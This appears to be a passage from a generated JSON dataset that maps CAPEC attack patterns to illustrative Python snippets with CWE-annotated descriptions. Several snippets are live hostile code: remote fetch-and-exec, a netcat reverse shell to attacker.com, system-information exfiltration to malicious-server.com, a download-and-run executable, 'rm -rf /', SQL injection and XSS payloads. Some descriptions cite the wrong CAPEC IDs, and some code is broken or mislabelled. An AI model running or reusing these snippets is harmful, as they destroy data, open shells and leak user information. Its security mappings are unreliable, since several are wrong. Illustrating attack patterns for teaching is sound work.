        "description": "This Python code snippet simulates a product assembly process where components are added and verified before being used in the final product. The `ProductAssembly` class has methods to add components, verify their trustworthiness, and assemble the product. The `verify_component` method checks if a component is trusted by comparing it against a list of known trusted components. If an untrusted (potentially counterfeit) component is detected, a warning is printed. This represents the CAPEC scenario where counterfeit hardware components are introduced during product assembly. The code also highlights related CWEs such as reliance on insufficiently trustworthy components (CWE-1357) and dependency on vulnerable third-party components (CWE-1395)."
    },
    {
        "capec_id": "521",
        "capec_name": "Hardware Design Specifications Are Altered",
        "code_snippet": "class HardwareComponent:\n    def __init__(self):\n        # CWE-1221: Incorrect Register Defaults or Module Parameters\n        self.register_defaults = {'security_mode': 0}  # Insecure default value\n        self.lock_bit = 0  # CWE-1231: Improper Prevention of Lock Bit Modification\n\n    def configure_security(self, mode):\n        if self.lock_bit == 0:  # Lock bit can be modified\n            self.register_defaults['security_mode'] = mode\n        else:\n            print('Security configuration is locked.')\n\n    def lock_configuration(self):\n        self.lock_bit = 1\n\n    def debug(self):\n        # CWE-1296: Incorrect Chaining or Granularity of Debug Components\n        print('Debugging information:')\n        print(self.register_defaults)\n        print(f'Lock bit status: {self.lock_bit}')\n\n# CWE-1059: Insufficient Technical Documentation\n# The following usage lacks sufficient documentation for secure implementation\ncomponent = HardwareComponent()\ncomponent.configure_security(1)  # Attempt to set secure mode\ncomponent.lock_configuration()  # Lock the configuration\ncomponent.configure_security(0)  # Attempt to change security mode after locking\ncomponent.debug()",
        "description": "This Python code snippet represents a simplified model of a hardware component configuration process, embodying the main idea of CAPEC-639: 'Hardware Design Specifications Are Altered'. The code includes several vulnerabilities related to the specified CWEs:\n\n1. **CWE-1221**: The `register_defaults` dictionary initializes with an insecure default value for 'security_mode'.\n2. **CWE-1231**: The `lock_bit` can be modified after being set, allowing potential unauthorized changes to the configuration.\n3. **CWE-1296**: The `debug` method provides debugging information without proper granularity or chaining, potentially exposing sensitive information.\n4. **CWE-1059**: The usage of the `HardwareComponent` class lacks sufficient technical documentation, making it difficult to ensure secure implementation.\n\nThe code demonstrates how an attacker could exploit these vulnerabilities by altering the design specifications, leading to insecure configurations and potential security breaches once the system is deployed."
    },
    {
        "capec_id": "522",
        "capec_name": "Malicious Hardware Component Replacement",
        "code_snippet": "class HardwareComponent:\n    def __init__(self, name, version, trusted=True):\n        self.name = name\n        self.version = version\n        self.trusted = trusted\n\n    def update_firmware(self):\n        if not self.trusted:\n            raise Exception('Cannot update untrusted hardware component')\n        print(f'Updating firmware for {self.name} to version {self.version + 1}')\n        self.version += 1\n\n    def inject_error(self):\n        if not self.trusted:\n            print(f'Error injected into {self.name}, causing system degradation')\n        else:\n            print(f'Error injection attempt failed on trusted component {self.name}')\n\n# Simulating a system with a mix of trusted and untrusted components\ncomponents = [\n    HardwareComponent('TrustedComponent', 1, trusted=True),\n    HardwareComponent('UntrustedComponent', 1, trusted=False)\n]\n\n# Attempt to update firmware\nfor component in components:\n    try:\n        component.update_firmware()\n    except Exception as e:\n        print(e)\n\n# Injecting errors into components\nfor component in components:\n    component.inject_error()",
        "description": "This Python code snippet simulates a system with hardware components that can be either trusted or untrusted. The `HardwareComponent` class has methods to update firmware and inject errors. The `update_firmware` method raises an exception if an attempt is made to update an untrusted component, representing CWE-1329 (Reliance on Component That is Not Updateable) and CWE-1357 (Reliance on Insufficiently Trustworthy Component). The `inject_error` method simulates error injection, which can degrade the system if the component is untrusted, representing CWE-1334 (Unauthorized Error Injection Can Degrade Hardware Redundancy). The code demonstrates the risks associated with using untrusted or counterfeit hardware components, aligning with the CAPEC description of malicious hardware component replacement."
    },
    {
        "capec_id": "523",
        "capec_name": "Malicious Software Implanted",
        "code_snippet": "import requests\n\n# CWE-1395: Dependency on Vulnerable Third-Party Component\n# Using a vulnerable third-party library to download and execute malicious code\nvulnerable_url = 'http://malicious.example.com/malware.py'\n\n# CWE-506: Embedded Malicious Code\n# Downloading and executing malicious code\nresponse = requests.get(vulnerable_url)\nexec(response.text)\n\n# CWE-509: Replicating Malicious Code (Virus or Worm)\n# Replicating the malicious code to other systems\nwith open('malware_copy.py', 'w') as file:\n    file.write(response.text)\n\n# CWE-1229: Creation of Emergent Resource\n# Creating a new resource that can be exploited\nwith open('/tmp/malicious_resource', 'w') as resource:\n    resource.write('malicious content')\n\n# CWE-1334: Unauthorized Error Injection Can Degrade Hardware Redundancy\n# Injecting errors to degrade system redundancy\nimport os\nos.system('echo 1 > /proc/sys/kernel/panic')",
        "description": "This Python code snippet demonstrates the concept of implanting malicious software into a system, as described in the CAPEC. It uses a vulnerable third-party component (CWE-1395) to download and execute malicious code (CWE-506). The code then replicates itself to other systems (CWE-509) and creates a new resource that can be exploited (CWE-1229). Finally, it injects errors to degrade system redundancy (CWE-1334). This snippet embodies the main idea of the CAPEC by showing how an attacker can implant and propagate malicious software within a system."
    },
    {
        "capec_id": "524",
        "capec_name": "Rogue Integration Procedures",
        "code_snippet": "import sqlite3\nimport requests\n\n# CWE-829: Inclusion of Functionality from Untrusted Control Sphere\nresponse = requests.get('http://untrusted-source.com/malicious_library.py')\nexec(response.text)\n\n# CWE-506: Embedded Malicious Code\nmalicious_code = \"\"\"\ndef backdoor():\n    import os\n    os.system('nc -e /bin/sh attacker.com 4444')\nbackdoor()\n\"\"\"\nexec(malicious_code)\n\n# CWE-89: SQL Injection\nuser_input = \"' OR '1'='1\"  # Malicious input\nconn = sqlite3.connect('example.db')\ncursor = conn.cursor()\ncursor.execute(f\"SELECT * FROM users WHERE username = '{user_input}'\")\n\n# CWE-707: Improper Neutralization\nmessage = \"<script>alert('XSS')</script>\"\nprint(f\"User message: {message}\")\n\n# CWE-1334: Unauthorized Error Injection\nclass RedundantSystem:\n    def __init__(self):\n        self.redundant_block = [1, 1, 1]\n    def inject_error(self):\n        self.redundant_block[0] = 0  # Degrade redundancy\n\nsystem = RedundantSystem()\nsystem.inject_error()",
        "description": "This Python code snippet demonstrates the concept of 'Rogue Integration Procedures' by incorporating various vulnerabilities that align with the related CWEs. The code includes the following vulnerabilities:\n\n1. CWE-829: The code fetches and executes a script from an untrusted source, potentially introducing malicious functionality.\n2. CWE-506: Embedded malicious code that opens a backdoor to the system.\n3. CWE-89: An SQL injection vulnerability that allows an attacker to manipulate SQL queries through user input.\n4. CWE-707: Improper neutralization of a user message, leading to potential XSS attacks.\n5. CWE-1334: Unauthorized error injection that degrades the redundancy of a system component.\n\nThese vulnerabilities collectively illustrate how an attacker might alter or establish rogue processes to insert malicious components into a system, leading to further compromise when the system is deployed."
    },
    {
        "capec_id": "528",
        "capec_name": "XML Flood",
        "code_snippet": "import xml.etree.ElementTree as ET\nfrom flask import Flask, request\n\napp = Flask(__name__)\n\n@app.route('/process_xml', methods=['POST'])\ndef process_xml():\n    try:\n        xml_data = request.data\n        tree = ET.ElementTree(ET.fromstring(xml_data))\n        # Process the XML data (omitted for brevity)\n        return 'XML processed successfully', 200\n    except ET.ParseError:\n        return 'Invalid XML', 400\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a simple web service using Flask that processes XML data sent via POST requests. The code does not implement any form of resource allocation limits, XML validation, or protection against XML-based attacks such as XML External Entity (XXE) or XML Entity Expansion (XEE). This makes it vulnerable to XML Flood attacks, where an adversary can send a large number of XML requests to overwhelm the service, potentially causing it to become unstable, freeze, or crash. The code also lacks proper validation against a schema, making it susceptible to malformed XML inputs."
    },
    {
        "capec_id": "529",
        "capec_name": "Malware-Directed Internal Reconnaissance",
        "code_snippet": "import os\nimport socket\nimport platform\nimport requests\n\n# Collect system information\nsystem_info = {\n    'os': platform.system(),\n    'os_version': platform.version(),\n    'hostname': socket.gethostname(),\n    'ip_address': socket.gethostbyname(socket.gethostname()),\n    'user': os.getlogin()\n}\n\n# Send collected information to an external server\nrequests.post('http://malicious-server.com/collect', json=system_info)\n",
        "description": "This Python code snippet demonstrates a basic example of malware-directed internal reconnaissance. It collects sensitive system information such as the operating system, OS version, hostname, IP address, and the current logged-in user. This information is then sent to an external server controlled by an attacker. The code embodies the main idea of the CAPEC by using malware to gather and exfiltrate information about the target system. The related CWEs are represented as follows: CWE-497 (Exposure of Sensitive System Information) is shown by collecting and sending system details without authorization, CWE-506 (Embedded Malicious Code) is represented by the malicious intent of the code, and CWE-512 (Spyware) is demonstrated by collecting user information without consent."
    },
    {
        "capec_id": "530",
        "capec_name": "Provide Counterfeit Component",
        "code_snippet": "import requests\n\nclass ThirdPartyComponent:\n    def __init__(self, url):\n        self.url = url\n        self.data = None\n\n    def fetch_data(self):\n        try:\n            response = requests.get(self.url)\n            if response.status_code == 200:\n                self.data = response.text\n            else:\n                raise ValueError('Failed to fetch data from the component')\n        except Exception as e:\n            print(f'Error fetching data: {e}')\n\n    def process_data(self):\n        if self.data:\n            # Simulate processing of the data\n            print('Processing data...')\n        else:\n            print('No data to process')\n\n# Usage of the third-party component\ncomponent = ThirdPartyComponent('http://example.com/counterfeit-component')\ncomponent.fetch_data()\ncomponent.process_data()",
        "description": "This Python code snippet demonstrates the concept of 'Provide Counterfeit Component' by simulating the use of a third-party component that is fetched from an external URL. The `ThirdPartyComponent` class is designed to fetch and process data from a given URL. The `fetch_data` method attempts to retrieve data from the URL, and if successful, stores it in the `data` attribute. The `process_data` method then simulates processing this data. This code embodies the CAPEC idea by showing how an attacker could provide a counterfeit component (via a malicious URL) that gets integrated into a system, potentially leading to vulnerabilities as described in the related CWEs, such as dependency on a vulnerable third-party component, reliance on an insufficiently trustworthy component, and the risk of embedded malicious code."
    },
    {
        "capec_id": "531",
        "capec_name": "Hardware Component Substitution",
        "code_snippet": "import os\n\nclass HardwareComponent:\n    def __init__(self, name, version, updateable=True):\n        self.name = name\n        self.version = version\n        self.updateable = updateable\n\n    def update_firmware(self, new_version):\n        if not self.updateable:\n            raise Exception('Component is not updateable')\n        self.version = new_version\n        print(f'Firmware updated to version {new_version}')\n\n    def execute_malicious_code(self):\n        # CWE-506: Embedded Malicious Code\n        os.system('rm -rf /')  # Dangerous command to delete all files\n\n# CWE-1395: Dependency on Vulnerable Third-Party Component\nvulnerable_component = HardwareComponent('VulnerableComponent', '1.0', updateable=False)\n\ntry:\n    # CWE-1329: Reliance on Component That is Not Updateable\n    vulnerable_component.update_firmware('2.0')\nexcept Exception as e:\n    print(e)\n\n# CWE-1256: Improper Restriction of Software Interfaces to Hardware Features\n# Simulating unauthorized access to hardware features\nvulnerable_component.execute_malicious_code()",
        "description": "This Python code snippet represents the concept of 'Hardware Component Substitution' by simulating a scenario where a hardware component is substituted with a malicious one. The `HardwareComponent` class models a hardware component with attributes for name, version, and updateability. The `update_firmware` method attempts to update the firmware, but raises an exception if the component is not updateable (CWE-1329). The `execute_malicious_code` method contains embedded malicious code (CWE-506) that simulates a dangerous operation. The code also demonstrates dependency on a vulnerable third-party component (CWE-1395) and improper restriction of software interfaces to hardware features (CWE-1256) by allowing execution of the malicious code. This snippet highlights the risks associated with substituting hardware components with malicious ones, leading to potential system compromise."
    },
    {
        "capec_id": "532",
        "capec_name": "Altered Installed BIOS",
        "code_snippet": "import os\n\nclass BIOSUpdater:\n    def __init__(self, firmware_path):\n        self.firmware_path = firmware_path\n        self.lock_bit = False  # CWE-1231: Improper Prevention of Lock Bit Modification\n\n    def update_firmware(self):\n        if not self.lock_bit:  # CWE-1231: Lock bit can be modified\n            try:\n                with open(self.firmware_path, 'rb') as firmware_file:\n                    firmware_data = firmware_file.read()\n                    # CWE-506: Embedded Malicious Code\n                    if b'MALICIOUS_CODE' in firmware_data:\n                        print(\"Warning: Malicious code detected!\")\n                    else:\n                        print(\"Firmware updated successfully.\")\n            except FileNotFoundError:\n                print(\"Firmware file not found.\")\n        else:\n            print(\"Firmware update locked.\")\n\n    def set_lock_bit(self):\n        self.lock_bit = True\n\n# CWE-1277: Firmware Not Updateable\n# CWE-1329: Reliance on Component That is Not Updateable\n# This class does not provide a method to update the lock bit once set\n\n# CWE-1220: Insufficient Granularity of Access Control\n# No granular access control implemented\n\n# Example usage\nupdater = BIOSUpdater('/path/to/firmware.bin')\nupdater.update_firmware()\nupdater.set_lock_bit()\nupdater.update_firmware()",
        "description": "This Python code snippet represents a simplified BIOS updater class that embodies the main idea of the CAPEC 'Altered Installed BIOS'. The class allows for updating firmware from a specified path and includes a lock bit mechanism to prevent further updates once set. However, it demonstrates several vulnerabilities: \n1. CWE-1231: The lock bit can be modified, allowing unauthorized changes.\n2. CWE-506: The code checks for embedded malicious code but does not prevent its execution if detected.\n3. CWE-1277 and CWE-1329: The class does not provide a method to update the lock bit or the firmware once set, making it non-updateable.\n4. CWE-1220: There is no granular access control, allowing broad access to the update functionality.\n\nThe code highlights the risks associated with insufficient security measures in BIOS updating processes, which can lead to exploitation by malicious actors."
    },
    {
        "capec_id": "533",
        "capec_name": "Malicious Manual Software Update",
        "code_snippet": "import requests\nimport os\n\n# CWE-494: Download of Code Without Integrity Check\nurl = 'http://malicious-website.com/malicious_update.exe'\nresponse = requests.get(url)\n\n# Save the downloaded file\nwith open('update.exe', 'wb') as file:\n    file.write(response.content)\n\n# CWE-506: Embedded Malicious Code\n# Execute the downloaded file without verifying its integrity\nos.system('update.exe')\n",
        "description": "This Python code snippet demonstrates a scenario where an attacker introduces malicious code to a victim's system by altering the payload of a software update. The code downloads an executable from a remote location without verifying its origin or integrity (CWE-494). It then saves the downloaded file and executes it directly, which could contain embedded malicious code (CWE-506). This represents the main idea of the CAPEC 'Malicious Manual Software Update', where an attacker tricks the user into downloading and running a malicious update, potentially compromising the system."
    },
    {
        "capec_id": "534",
        "capec_name": "Malicious Hardware Update",
        "code_snippet": "class HardwareComponent:\n    def __init__(self, firmware_version):\n        self.firmware_version = firmware_version\n        self.is_updateable = False\n        self.malicious_code = False\n\n    def replace_component(self, new_component):\n        if not new_component.is_updateable:\n            print(\"Warning: Replacing with non-updateable component!\")\n        self.firmware_version = new_component.firmware_version\n        self.is_updateable = new_component.is_updateable\n        self.malicious_code = new_component.malicious_code\n\n    def check_for_malicious_code(self):\n        if self.malicious_code:\n            print(\"Alert: Malicious code detected!\")\n        else:\n            print(\"No malicious code detected.\")\n\n# Simulating the replacement of a good component with a malicious one\noriginal_component = HardwareComponent(firmware_version=\"1.0\")\nmalicious_component = HardwareComponent(firmware_version=\"1.1\")\nmalicious_component.is_updateable = False\nmalicious_component.malicious_code = True\n\n# Replacing the original component with the malicious one\noriginal_component.replace_component(malicious_component)\n\n# Checking for malicious code\noriginal_component.check_for_malicious_code()",
        "description": "This Python code snippet simulates the replacement of a hardware component with a malicious one, embodying the main idea of the CAPEC 'Malicious Hardware Update'. The `HardwareComponent` class represents a hardware component with attributes for firmware version, updateability, and presence of malicious code. The `replace_component` method simulates the replacement process, warning if the new component is not updateable. The `check_for_malicious_code` method checks if the component contains malicious code. The code demonstrates how an adversary could replace a good component with a malicious one that is not updateable and contains embedded malicious code, reflecting the related CWEs."
    },
    {
        "capec_id": "535",
        "capec_name": "Malicious Gray Market Hardware",
        "code_snippet": "class MaliciousHardwareComponent:\n    def __init__(self):\n        self.firmware_version = '1.0.0'\n        self.malicious_code = True\n        self.confidential_data = 'Sensitive Information'\n\n    def update_firmware(self, new_version):\n        # Simulate inability to update firmware\n        print(f'Attempting to update firmware to {new_version}...')\n        print('Update failed: Component is not updateable.')\n\n    def access_confidential_data(self):\n        # Simulate unauthorized access to confidential data\n        if self.malicious_code:\n            print(f'Accessing confidential data: {self.confidential_data}')\n        else:\n            print('No malicious code present.')\n\n# Example usage\ncomponent = MaliciousHardwareComponent()\ncomponent.update_firmware('1.0.1')\ncomponent.access_confidential_data()",
        "description": "This Python code snippet represents a malicious hardware component that embodies the main idea of the CAPEC 'Malicious Gray Market Hardware'. The class `MaliciousHardwareComponent` simulates a hardware component with embedded malicious code (CWE-506) that cannot be updated (CWE-1329). The `access_confidential_data` method demonstrates unauthorized access to confidential information (CWE-1297). The `update_firmware` method shows the inability to update the firmware, highlighting the reliance on a non-updateable component. This snippet illustrates how an attacker could compromise a system by introducing malicious hardware components into the supply chain."
    },
    {
        "capec_id": "536",
        "capec_name": "Data Injected During Configuration",
        "code_snippet": "import os\n\ndef load_configuration(file_path):\n    if not os.path.exists(file_path):\n        raise FileNotFoundError('Configuration file not found.')\n\n    with open(file_path, 'r') as file:\n        config_data = file.read()\n\n    # Simulate improper access control by allowing any user to modify the config file\n    if 'malicious_data' in config_data:\n        print('Warning: Malicious data detected in configuration!')\n    else:\n        print('Configuration loaded successfully.')\n\n# Example usage\nconfig_file = '/tmp/config.txt'\nload_configuration(config_file)",
        "description": "This Python code snippet demonstrates a scenario where an attacker can inject malicious data into a configuration file, leading to suboptimal system performance. The `load_configuration` function reads a configuration file from a specified path. The code lacks proper access control (CWE-284), allowing any user to modify the configuration file. Additionally, the use of a temporary file in `/tmp` (CWE-377) can be insecure, as it is a common directory accessible by all users. The code checks for the presence of 'malicious_data' in the configuration file, simulating the detection of injected malicious data. This represents the CAPEC idea of an attacker injecting malicious data during configuration, causing the system to behave in a way that benefits the adversary."
    },
    {
        "capec_id": "537",
        "capec_name": "Infiltration of Hardware Development Environment",
        "code_snippet": "import os\n\n# CWE-506: Embedded Malicious Code\n# CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n# CWE-1297: Unprotected Confidential Information on Device is Accessible by OSAT Vendors\n\n# Malicious function to exfiltrate sensitive information\ndef exfiltrate_data(file_path):\n    try:\n        with open(file_path, 'r') as file:\n            data = file.read()\n            # Simulate sending data to an unauthorized external server\n            send_to_server(data)\n    except Exception as e:\n        print(f'Error accessing file: {e}')\n\n# Simulated function to send data to an external server\n# This represents the malicious intent of the adversary\ndef send_to_server(data):\n    # CWE-497: Exposing sensitive information\n    print(f'Sending data to external server: {data}')\n\n# CWE-1329: Reliance on Component That is Not Updateable\n# Simulate a hardware component that cannot be updated\nclass NonUpdateableComponent:\n    def __init__(self):\n        self.firmware_version = '1.0'\n\n    def get_firmware_version(self):\n        return self.firmware_version\n\n# CWE-1247: Improper Protection Against Voltage and Clock Glitches\n# Simulate a device that is vulnerable to voltage and clock glitches\nclass VulnerableDevice:\n    def __init__(self):\n        self.sensitive_data = 'TopSecretInformation'\n\n    def read_sensitive_data(self):\n        return self.sensitive_data\n\n# Main function to demonstrate the infiltration\nif __name__ == '__main__':\n    # Simulate the presence of a non-updateable component\n    component = NonUpdateableComponent()\n    print(f'Firmware version: {component.get_firmware_version()}')\n\n    # Simulate the presence of a vulnerable device\n    device = VulnerableDevice()\n    sensitive_info = device.read_sensitive_data()\n    print(f'Sensitive data: {sensitive_info}')\n\n    # Exfiltrate sensitive data\n    exfiltrate_data('confidential.txt')",
        "description": "This Python code snippet demonstrates the concept of 'Infiltration of Hardware Development Environment' by simulating the presence of malicious code that exfiltrates sensitive information. The code includes a function to read and send sensitive data to an unauthorized external server, representing CWE-506 (Embedded Malicious Code) and CWE-497 (Exposure of Sensitive System Information to an Unauthorized Control Sphere). It also simulates a non-updateable hardware component (CWE-1329) and a device vulnerable to voltage and clock glitches (CWE-1247). The exfiltration function attempts to read a file containing confidential information, which could be accessible by OSAT vendors (CWE-1297). This snippet encapsulates the idea of an adversary infiltrating a hardware development environment to compromise the system."
    },
    {
        "capec_id": "538",
        "capec_name": "Open-Source Library Manipulation",
        "code_snippet": "import requests\n\n# CWE-494: Download of Code Without Integrity Check\nurl = 'http://example.com/malicious_library.py'\nresponse = requests.get(url)\n\n# CWE-829: Inclusion of Functionality from Untrusted Control Sphere\nexec(response.text)\n\n# CWE-1395: Dependency on Vulnerable Third-Party Component\n# CWE-506: Embedded Malicious Code\n# CWE-509: Replicating Malicious Code (Virus or Worm)\ndef malicious_function():\n    # Malicious code that could replicate or perform harmful actions\n    print('Malicious code executed')\n    # Example of replicating malicious code\n    with open('malicious_copy.py', 'w') as f:\n        f.write(response.text)\n\nmalicious_function()",
        "description": "This Python code snippet demonstrates the concept of 'Open-Source Library Manipulation' by downloading and executing code from an untrusted source without verifying its integrity (CWE-494). The code imports and executes functionality from an external source (CWE-829), which could contain embedded malicious code (CWE-506) or depend on vulnerable third-party components (CWE-1395). The 'malicious_function' represents the execution of harmful actions and the replication of malicious code (CWE-509), illustrating how an adversary could implant and distribute malicious code through open-source libraries."
    },
    {
        "capec_id": "539",
        "capec_name": "ASIC With Malicious Functionality",
        "code_snippet": "class ASIC:\n    def __init__(self):\n        self.security_token = 'secure_token'\n        self.sensitive_info = 'Sensitive System Information'\n\n    def execute(self, token):\n        if token == self.security_token:\n            print('Executing legitimate functionality')\n        else:\n            self.malicious_functionality()\n\n    def malicious_functionality(self):\n        # Malicious code that exposes sensitive information\n        print(f'Exposing sensitive information: {self.sensitive_info}')\n\n# Simulating an attacker inserting malicious functionality\nasic = ASIC()\n# Attacker uses an incorrect token to trigger malicious functionality\nasic.execute('malicious_token')",
        "description": "This Python code snippet represents an ASIC (Application-Specific Integrated Circuit) class with a security token mechanism. The `execute` method checks if the provided token matches the secure token. If it does not, it triggers a malicious functionality that exposes sensitive system information. This embodies the CAPEC idea of an attacker inserting malicious functionality into an ASIC to disrupt or compromise the system. The related CWEs are represented by the exposure of sensitive information (CWE-497), improper restriction of security token assignment (CWE-1259), and embedded malicious code (CWE-506)."
    },
    {
        "capec_id": "540",
        "capec_name": "Overread Buffers",
        "code_snippet": "def read_buffer(data, index):\n    buffer = [1, 2, 3, 4, 5]\n    try:\n        return buffer[index]\n    except IndexError:\n        return 'Index out of bounds!'\n\n# Example usage\nuser_input = int(input('Enter an index: '))\nprint(read_buffer(buffer, user_input))",
        "description": "This Python code snippet demonstrates a simple buffer over-read vulnerability. The function `read_buffer` takes a list `data` and an `index` as input and attempts to return the element at the specified index from a predefined buffer. If the index is out of bounds, an `IndexError` is caught, and a message 'Index out of bounds!' is returned. However, the code does not properly handle the user input, which can lead to an out-of-bounds read if the user provides an index outside the valid range of the buffer. This represents the main idea of the CAPEC 'Overread Buffers' and is related to CWEs such as 'Out-of-bounds Read' (CWE-125) and 'Buffer Over-read' (CWE-126)."
    },
    {
        "capec_id": "541",
        "capec_name": "Application Fingerprinting",
        "code_snippet": "import socket\n\n# Function to determine the type or version of an application\n# by observing response discrepancies\n\ndef fingerprint_application(ip, port):\n    try:\n        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n            s.connect((ip, port))\n            s.sendall(b'GET / HTTP/1.1\\r\\nHost: example.com\\r\\n\\r\\n')\n            response = s.recv(1024)\n            if b'Apache' in response:\n                return 'Apache Server Detected'\n            elif b'nginx' in response:\n                return 'Nginx Server Detected'\n            else:\n                return 'Unknown Server'\n    except Exception as e:\n        return f'Error: {e}'\n\n# Example usage\nip = '192.168.1.1'\nport = 80\nprint(fingerprint_application(ip, port))",
        "description": "This Python code snippet demonstrates the concept of 'Application Fingerprinting' by attempting to determine the type or version of a web server running on a remote target. The function `fingerprint_application` connects to a specified IP and port, sends an HTTP request, and analyzes the response to identify the server type based on observable response discrepancies (CWE-204). The code checks for specific server signatures (e.g., 'Apache' or 'nginx') in the response. This approach can reveal internal state information to an unauthorized actor, aligning with the CAPEC description. The code is concise and highlights the potential security risk of observable discrepancies in application responses."
    },
    {
        "capec_id": "542",
        "capec_name": "Targeted Malware",
        "code_snippet": "import os\nimport requests\n\n# CWE-506: Embedded Malicious Code\n# CWE-507: Trojan Horse\n# CWE-512: Spyware\n\nclass TargetedMalware:\n    def __init__(self, target_url):\n        self.target_url = target_url\n\n    def gather_system_info(self):\n        # CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n        system_info = {\n            'os': os.name,\n            'user': os.getlogin(),\n            'cwd': os.getcwd()\n        }\n        return system_info\n\n    def send_data(self, data):\n        # CWE-509: Replicating Malicious Code (Virus or Worm)\n        requests.post(self.target_url, json=data)\n\n    def execute(self):\n        system_info = self.gather_system_info()\n        self.send_data(system_info)\n\nif __name__ == '__main__':\n    malware = TargetedMalware('http://malicious-server.com/collect')\n    malware.execute()",
        "description": "This Python code snippet represents a targeted malware attack that gathers sensitive system information and sends it to a malicious server. The `TargetedMalware` class is designed to collect system information such as the operating system, current user, and current working directory (CWE-497). This information is then sent to a specified URL (CWE-509). The code also embodies the concept of embedded malicious code (CWE-506) and acts as a Trojan Horse (CWE-507) by appearing to be a benign script while performing malicious activities. Additionally, it functions as spyware (CWE-512) by collecting and transmitting user information without explicit consent."
    },
    {
        "capec_id": "543",
        "capec_name": "Counterfeit Websites",
        "code_snippet": "from flask import Flask, request, redirect\nimport requests\n\napp = Flask(__name__)\n\n# CWE-601: URL Redirection to Untrusted Site ('Open Redirect')\n@app.route('/redirect')\ndef open_redirect():\n    target_url = request.args.get('url')\n    return redirect(target_url)\n\n# CWE-494: Download of Code Without Integrity Check\n@app.route('/download')\ndef download_code():\n    code_url = request.args.get('code_url')\n    response = requests.get(code_url)\n    exec(response.text)\n    return 'Code executed'\n\n# CWE-352: Cross-Site Request Forgery (CSRF)\n@app.route('/transfer', methods=['POST'])\ndef transfer_funds():\n    amount = request.form['amount']\n    # Simulate a fund transfer without CSRF protection\n    return f'Transferred {amount} dollars'\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet uses the Flask web framework to create a counterfeit website that demonstrates several vulnerabilities. The '/redirect' route exemplifies CWE-601 by redirecting users to a URL specified by user input, which can be exploited for phishing attacks. The '/download' route demonstrates CWE-494 by downloading and executing code from a user-specified URL without verifying its integrity, potentially allowing the execution of malicious code. The '/transfer' route simulates a fund transfer operation without CSRF protection (CWE-352), making it susceptible to CSRF attacks. This code embodies the main idea of the CAPEC by creating a counterfeit website that can gather information or upload malware through these vulnerabilities."
    },
    {
        "capec_id": "544",
        "capec_name": "Counterfeit Organizations",
        "code_snippet": "import ssl\nimport socket\n\n# CWE-295: Improper Certificate Validation\ncontext = ssl.create_default_context()\ncontext.check_hostname = False  # Disabling hostname check\ncontext.verify_mode = ssl.CERT_NONE  # Disabling certificate verification\n\n# CWE-941: Incorrectly Specified Destination in a Communication Channel\nserver_address = ('malicious-supplier.com', 443)  # Incorrect destination\n\n# CWE-656: Reliance on Security Through Obscurity\nobscure_key = 'secret_key'  # Security through obscurity\n\n# CWE-1229: Creation of Emergent Resource\n# CWE-207: Observable Behavioral Discrepancy With Equivalent Products\n# Simulating a counterfeit organization behavior\ntry:\n    with socket.create_connection(server_address) as sock:\n        with context.wrap_socket(sock, server_hostname=server_address[0]) as ssock:\n            ssock.sendall(b'GET / HTTP/1.1\\r\\nHost: malicious-supplier.com\\r\\n\\r\\n')\n            response = ssock.recv(1024)\n            print(response.decode('utf-8'))\nexcept Exception as e:\n    print(f'Connection failed: {e}')",
        "description": "This Python code snippet demonstrates a scenario where an adversary creates a counterfeit organization that injects malicious components into the supply chain. The code includes several vulnerabilities: \n1. CWE-295: Improper Certificate Validation - The SSL context is configured to disable hostname checking and certificate verification, making it easier for an attacker to present a counterfeit certificate.\n2. CWE-941: Incorrectly Specified Destination in a Communication Channel - The code connects to a malicious server ('malicious-supplier.com') instead of a legitimate one.\n3. CWE-656: Reliance on Security Through Obscurity - The code uses an obscure key ('secret_key') as a weak security measure.\n4. CWE-1229 and CWE-207: The code simulates the behavior of a counterfeit organization by connecting to a malicious server and potentially exposing discrepancies in behavior compared to legitimate products. This can be observed by attackers to identify and exploit the counterfeit organization."
    },
    {
        "capec_id": "545",
        "capec_name": "Pull Data from System Resources",
        "code_snippet": "import os\nimport mmap\n\n# Simulate sensitive data in a file\nsensitive_file_path = 'sensitive_data.txt'\nwith open(sensitive_file_path, 'w') as f:\n    f.write('Sensitive Information: SecretKey123')\n\n# Improperly zeroize sensitive data in memory\nwith open(sensitive_file_path, 'r+b') as f:\n    mm = mmap.mmap(f.fileno(), 0)\n    mm.write(b'\\x00' * len(mm))  # Attempt to clear the file content\n    mm.close()\n\n# Simulate improper scrubbing of sensitive data\nos.remove(sensitive_file_path)\n\n# Simulate pulling data from system resources\nwith open('/proc/self/maps', 'r') as maps_file:\n    for line in maps_file:\n        if sensitive_file_path in line:\n            print('Found sensitive data mapping:', line)\n\n# Simulate remanent data readable after memory erase\nwith open('/proc/self/mem', 'rb') as mem_file:\n    mem_file.seek(0)\n    data = mem_file.read(1024)\n    if b'SecretKey123' in data:\n        print('Sensitive data still readable in memory:', data)\n",
        "description": "This Python code snippet demonstrates a scenario where sensitive data is improperly handled, leading to potential exposure. The code first writes sensitive information to a file and then attempts to zeroize the data in memory using mmap. However, this zeroization is not secure. The file is then deleted, simulating improper scrubbing of sensitive data. The code also simulates an adversary pulling data from system resources by reading the memory mappings and checking if the sensitive data is still accessible. Finally, it checks if the sensitive data is still readable in memory after the supposed erase, demonstrating remanent data issues. This snippet embodies the main idea of CAPEC-118 (Pull Data from System Resources) and highlights related CWEs such as improper zeroization, improper scrubbing, and remanent data issues."
    },
    {
        "capec_id": "546",
        "capec_name": "Incomplete Data Deletion in a Multi-Tenant Environment",
        "code_snippet": "import os\nimport tempfile\n\nclass CloudStorage:\n    def __init__(self):\n        self.storage = tempfile.NamedTemporaryFile(delete=False)\n\n    def store_data(self, data):\n        self.storage.write(data.encode('utf-8'))\n        self.storage.flush()\n\n    def delete_data(self):\n        # Incomplete deletion: only closing the file, not securely wiping the data\n        self.storage.close()\n        os.remove(self.storage.name)\n\n# Simulating a multi-tenant environment\ncloud_storage = CloudStorage()\ncloud_storage.store_data('Sensitive Information')\ncloud_storage.delete_data()\n\n# New tenant accessing the same storage resource\nnew_tenant_storage = CloudStorage()\nwith open(new_tenant_storage.storage.name, 'r') as file:\n    leftover_data = file.read()\n    print('Leftover data:', leftover_data)",
